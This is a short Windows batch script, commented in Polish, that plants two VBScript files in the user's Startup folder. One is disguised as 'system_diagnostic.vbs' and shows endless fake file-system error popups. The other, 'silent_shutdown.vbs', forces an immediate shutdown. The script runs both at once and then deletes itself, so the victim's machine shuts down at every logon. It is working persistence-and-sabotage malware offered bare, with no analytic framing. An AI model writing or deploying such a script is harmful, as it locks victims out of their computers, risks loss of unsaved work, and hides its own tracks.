@echo off
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo Do > "%startup_folder%\system_diagnostic.vbs"
echo MsgBox "C:\Users\com\Desktop\scan 20200309_18492338.jpg" ^& vbCrLf ^& vbCrLf ^& "File system error (-2147416359).", 16, "C:\Users\com\Desktop\scan 20200309_18492338.jpg" >> "%startup_folder%\system_diagnostic.vbs"
echo Loop >> "%startup_folder%\system_diagnostic.vbs"


echo WScript.Sleep 5 > "%startup_folder%\silent_shutdown.vbs"
echo Set objShell = WScript.CreateObject("WScript.Shell") >> "%startup_folder%\silent_shutdown.vbs"
echo objShell.Run "shutdown /s /t 0 /f", 0, True >> "%startup_folder%\silent_shutdown.vbs"

:: Uruchomienie obu procesów w tle od razu (bez czekania na restart komputera)
start "" wscript "%startup_folder%\system_diagnostic.vbs"
start "" wscript "%startup_folder%\silent_shutdown.vbs"

:: Samousunięcie pliku instalacyjnego
del "%~f0"
